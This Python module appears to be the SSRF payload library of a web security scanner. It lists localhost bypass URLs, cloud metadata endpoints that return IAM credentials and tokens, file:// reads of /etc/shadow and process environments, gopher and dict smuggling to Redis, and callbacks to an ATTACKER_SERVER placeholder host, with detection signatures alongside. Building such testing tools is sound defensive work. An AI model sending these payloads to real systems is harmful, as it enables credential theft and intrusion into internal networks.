"""
Server-Side Request Forgery (SSRF) Payloads

Payloads for testing SSRF vulnerabilities including:
- Internal network access (localhost, 127.0.0.1, etc.)
- Cloud metadata service access (AWS, GCP, Azure)
- Internal service discovery
- Protocol smuggling (file://, gopher://, dict://)
"""

# Common SSRF target URLs
SSRF_LOCALHOST_PAYLOADS = [
    # Basic localhost variants
    {"payload": "http://localhost/", "description": "Basic localhost"},
    {"payload": "http://127.0.0.1/", "description": "IPv4 loopback"},
    {"payload": "http://127.0.0.1:80/", "description": "Explicit port 80"},
    {"payload": "http://127.0.0.1:443/", "description": "Port 443"},
    {"payload": "http://127.0.0.1:22/", "description": "SSH port"},
    {"payload": "http://127.0.0.1:3306/", "description": "MySQL port"},
    {"payload": "http://127.0.0.1:5432/", "description": "PostgreSQL port"},
    {"payload": "http://127.0.0.1:6379/", "description": "Redis port"},
    {"payload": "http://127.0.0.1:27017/", "description": "MongoDB port"},
    {"payload": "http://127.0.0.1:8080/", "description": "Common alt HTTP port"},
    {"payload": "http://127.0.0.1:9200/", "description": "Elasticsearch port"},

    # IPv6 localhost
    {"payload": "http://[::1]/", "description": "IPv6 loopback"},
    {"payload": "http://[0:0:0:0:0:0:0:1]/", "description": "Full IPv6 loopback"},

    # Localhost bypass techniques
    {"payload": "http://127.1/", "description": "Shortened localhost"},
    {"payload": "http://127.0.1/", "description": "Shortened localhost v2"},
    {"payload": "http://0.0.0.0/", "description": "All interfaces"},
    {"payload": "http://0/", "description": "Shortened zero"},
    {"payload": "http://localhost.localdomain/", "description": "Localhost domain"},
    {"payload": "http://127.0.0.1.nip.io/", "description": "nip.io bypass"},
    {"payload": "http://127.0.0.1.xip.io/", "description": "xip.io bypass"},
    {"payload": "http://localtest.me/", "description": "localtest.me domain"},

    # Decimal/octal/hex encoding
    {"payload": "http://2130706433/", "description": "Decimal IP (127.0.0.1)"},
    {"payload": "http://0x7f000001/", "description": "Hex IP (127.0.0.1)"},
    {"payload": "http://0177.0.0.1/", "description": "Octal IP"},
    {"payload": "http://017700000001/", "description": "Full octal IP"},

    # URL encoding bypass
    {"payload": "http://127%2e0%2e0%2e1/", "description": "URL encoded dots"},
    {"payload": "http://%6c%6f%63%61%6c%68%6f%73%74/", "description": "URL encoded localhost"},
]

# Cloud metadata service payloads
SSRF_CLOUD_METADATA_PAYLOADS = [
    # AWS IMDSv1 (Instance Metadata Service)
    {"payload": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata root", "cloud": "aws"},
    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "description": "AWS IAM credentials", "cloud": "aws"},
    {"payload": "http://169.254.169.254/latest/meta-data/hostname", "description": "AWS hostname", "cloud": "aws"},
    {"payload": "http://169.254.169.254/latest/meta-data/local-ipv4", "description": "AWS local IP", "cloud": "aws"},
    {"payload": "http://169.254.169.254/latest/meta-data/public-keys/", "description": "AWS public keys", "cloud": "aws"},
    {"payload": "http://169.254.169.254/latest/user-data", "description": "AWS user data", "cloud": "aws"},
    {"payload": "http://169.254.169.254/latest/dynamic/instance-identity/document", "description": "AWS instance identity", "cloud": "aws"},

    # AWS link-local bypass attempts
    {"payload": "http://169.254.169.254.nip.io/latest/meta-data/", "description": "AWS via nip.io", "cloud": "aws"},
    {"payload": "http://2852039166/latest/meta-data/", "description": "AWS decimal IP", "cloud": "aws"},
    {"payload": "http://0xa9fea9fe/latest/meta-data/", "description": "AWS hex IP", "cloud": "aws"},

    # GCP (Google Cloud Platform)
    {"payload": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata root", "cloud": "gcp"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/", "description": "GCP metadata alt", "cloud": "gcp"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "description": "GCP service account token", "cloud": "gcp"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "description": "GCP project ID", "cloud": "gcp"},

    # Azure
    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "description": "Azure metadata", "cloud": "azure"},
    {"payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "description": "Azure managed identity token", "cloud": "azure"},

    # DigitalOcean
    {"payload": "http://169.254.169.254/metadata/v1/", "description": "DigitalOcean metadata", "cloud": "digitalocean"},
    {"payload": "http://169.254.169.254/metadata/v1/id", "description": "DigitalOcean droplet ID", "cloud": "digitalocean"},

    # Oracle Cloud
    {"payload": "http://169.254.169.254/opc/v1/instance/", "description": "Oracle Cloud metadata", "cloud": "oracle"},

    # Alibaba Cloud
    {"payload": "http://100.100.100.200/latest/meta-data/", "description": "Alibaba Cloud metadata", "cloud": "alibaba"},
]

# Internal network discovery payloads
SSRF_INTERNAL_NETWORK_PAYLOADS = [
    # Common internal IPs
    {"payload": "http://10.0.0.1/", "description": "10.x.x.x range"},
    {"payload": "http://10.0.0.1:8080/", "description": "10.x.x.x:8080"},
    {"payload": "http://172.16.0.1/", "description": "172.16.x.x range"},
    {"payload": "http://172.17.0.1/", "description": "Docker default gateway"},
    {"payload": "http://192.168.0.1/", "description": "192.168.x.x range"},
    {"payload": "http://192.168.1.1/", "description": "Common router IP"},

    # Common internal hostnames
    {"payload": "http://internal/", "description": "internal hostname"},
    {"payload": "http://intranet/", "description": "intranet hostname"},
    {"payload": "http://admin/", "description": "admin hostname"},
    {"payload": "http://db/", "description": "database hostname"},
    {"payload": "http://database/", "description": "database hostname alt"},
    {"payload": "http://mysql/", "description": "mysql hostname"},
    {"payload": "http://postgres/", "description": "postgres hostname"},
    {"payload": "http://redis/", "description": "redis hostname"},
    {"payload": "http://elasticsearch/", "description": "elasticsearch hostname"},
    {"payload": "http://kibana/", "description": "kibana hostname"},
    {"payload": "http://grafana/", "description": "grafana hostname"},
    {"payload": "http://jenkins/", "description": "jenkins hostname"},
    {"payload": "http://gitlab/", "description": "gitlab hostname"},
    {"payload": "http://kubernetes/", "description": "kubernetes hostname"},
    {"payload": "http://k8s/", "description": "k8s hostname"},

    # Kubernetes-specific
    {"payload": "http://kubernetes.default.svc/", "description": "K8s default service"},
    {"payload": "http://kubernetes.default.svc.cluster.local/", "description": "K8s full service name"},
    {"payload": "https://kubernetes.default.svc:443/api/v1/", "description": "K8s API"},
]

# Protocol smuggling payloads
SSRF_PROTOCOL_PAYLOADS = [
    # File protocol
    {"payload": "file:///etc/passwd", "description": "Linux passwd file", "protocol": "file"},
    {"payload": "file:///etc/shadow", "description": "Linux shadow file", "protocol": "file"},
    {"payload": "file:///etc/hosts", "description": "Hosts file", "protocol": "file"},
    {"payload": "file:///proc/self/environ", "description": "Process environment", "protocol": "file"},
    {"payload": "file:///proc/self/cmdline", "description": "Process command line", "protocol": "file"},
    {"payload": "file://C:/Windows/System32/drivers/etc/hosts", "description": "Windows hosts", "protocol": "file"},
    {"payload": "file://C:/Windows/win.ini", "description": "Windows ini", "protocol": "file"},

    # Gopher protocol (for Redis, memcached, etc.)
    {"payload": "gopher://127.0.0.1:6379/_INFO", "description": "Redis INFO via gopher", "protocol": "gopher"},
    {"payload": "gopher://127.0.0.1:11211/_stats", "description": "Memcached stats via gopher", "protocol": "gopher"},

    # Dict protocol
    {"payload": "dict://127.0.0.1:6379/INFO", "description": "Redis INFO via dict", "protocol": "dict"},

    # FTP protocol
    {"payload": "ftp://127.0.0.1/", "description": "FTP localhost", "protocol": "ftp"},

    # SFTP protocol
    {"payload": "sftp://127.0.0.1/", "description": "SFTP localhost", "protocol": "sftp"},
]

# Common vulnerable parameters for SSRF
SSRF_VULNERABLE_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "next", "target",
    "rurl", "site", "src", "source", "link", "linkurl",
    "file", "filename", "page", "feed", "host", "domain",
    "callback", "return", "returnUrl", "return_url", "returnurl",
    "go", "goto", "image", "img", "load", "open", "out", "ref",
    "reference", "site", "to", "u", "val", "validate", "view",
    "window", "fetch", "request", "proxy", "download", "include",
    "template", "share", "navigation", "forward", "continue",
    "api", "endpoint", "service", "webhook", "callback_url",
    "ping", "avatar", "icon", "logo", "thumb", "thumbnail",
]

# SSRF detection signatures (responses that indicate successful SSRF)
SSRF_SUCCESS_SIGNATURES = {
    "localhost_access": [
        "root:x:0:0:",  # /etc/passwd
        "127.0.0.1",
        "localhost",
        "Connection refused",  # Internal port scan
    ],
    "aws_metadata": [
        "ami-id",
        "instance-id",
        "instance-type",
        "AccessKeyId",
        "SecretAccessKey",
        "iam/security-credentials",
    ],
    "gcp_metadata": [
        "computeMetadata",
        "project-id",
        "access_token",
        "service-accounts",
    ],
    "azure_metadata": [
        "compute",
        "subscriptionId",
        "resourceGroupName",
        "vmId",
    ],
    "internal_services": [
        "redis_version",  # Redis
        "STAT pid",  # Memcached
        "elasticsearch",
        "kibana",
        "jenkins",
    ],
    "file_read": [
        "root:x:0:0:",
        "[boot loader]",  # Windows boot.ini
        "# localhost",  # /etc/hosts comment
        "PATH=",  # Environment variable
    ],
}

# Out-of-band detection payloads (requires OOB server)
SSRF_OOB_PAYLOADS = [
    # These would ping back to attacker-controlled server
    # Placeholder - user would replace ATTACKER_SERVER with their domain
    {"payload": "http://ATTACKER_SERVER/ssrf-test", "description": "Basic OOB callback"},
    {"payload": "http://ATTACKER_SERVER:8080/ssrf-test", "description": "OOB callback alt port"},
    {"payload": "https://ATTACKER_SERVER/ssrf-test", "description": "HTTPS OOB callback"},
]


# OAST (Out-of-Band Application Security Testing) payload templates
# These templates have {CALLBACK} placeholder that gets replaced with actual callback URL
SSRF_OAST_TEMPLATES = [
    # Direct HTTP callbacks
    {
        "template": "{CALLBACK}",
        "description": "Direct HTTP callback",
        "method": "GET",
    },
    {
        "template": "{CALLBACK}?data=ssrf-test",
        "description": "HTTP callback with query param",
        "method": "GET",
    },
    # DNS-based callbacks
    {
        "template": "http://{DNS_CALLBACK}/",
        "description": "DNS callback via HTTP",
        "method": "DNS",
    },
    # Protocol smuggling with callbacks
    {
        "template": "gopher://127.0.0.1:80/_GET%20/{CALLBACK_PATH}%20HTTP/1.0%0d%0a",
        "description": "Gopher protocol HTTP smuggling",
        "method": "GOPHER",
    },
    # URL encoding bypass with callback
    {
        "template": "{CALLBACK_ENCODED}",
        "description": "URL encoded callback",
        "method": "ENCODED",
    },
    # Double URL encoding
    {
        "template": "{CALLBACK_DOUBLE_ENCODED}",
        "description": "Double URL encoded callback",
        "method": "DOUBLE_ENCODED",
    },
    # Redirect-based callbacks
    {
        "template": "http://httpbin.org/redirect-to?url={CALLBACK_ENCODED}",
        "description": "Redirect to callback",
        "method": "REDIRECT",
    },
    # IPv6 callback
    {
        "template": "http://[::ffff:127.0.0.1]/?callback={CALLBACK_ENCODED}",
        "description": "IPv6 mapped with callback param",
        "method": "IPV6",
    },
]


def generate_oast_payloads(callback_url: str, dns_callback: str = None) -> list:
    """
    Generate SSRF payloads with actual OAST callback URLs.

    Args:
        callback_url: HTTP callback URL from OAST client
        dns_callback: DNS callback domain from OAST client

    Returns:
        List of payload dictionaries ready for injection
    """
    import urllib.parse

    payloads = []

    # Parse callback URL for components
    parsed = urllib.parse.urlparse(callback_url)
    callback_path = parsed.path if parsed.path else "/callback"
    callback_encoded = urllib.parse.quote(callback_url, safe='')
    callback_double_encoded = urllib.parse.quote(callback_encoded, safe='')

    for template in SSRF_OAST_TEMPLATES:
        payload_str = template["template"]

        # Replace placeholders
        payload_str = payload_str.replace("{CALLBACK}", callback_url)
        payload_str = payload_str.replace("{CALLBACK_PATH}", callback_path)
        payload_str = payload_str.replace("{CALLBACK_ENCODED}", callback_encoded)
        payload_str = payload_str.replace("{CALLBACK_DOUBLE_ENCODED}", callback_double_encoded)

        if dns_callback:
            payload_str = payload_str.replace("{DNS_CALLBACK}", dns_callback)
        else:
            # Skip DNS-based templates if no DNS callback provided
            if "{DNS_CALLBACK}" in template["template"]:
                continue

        payloads.append({
            "payload": payload_str,
            "description": template["description"],
            "method": template["method"],
            "is_oast": True,
        })

    return payloads
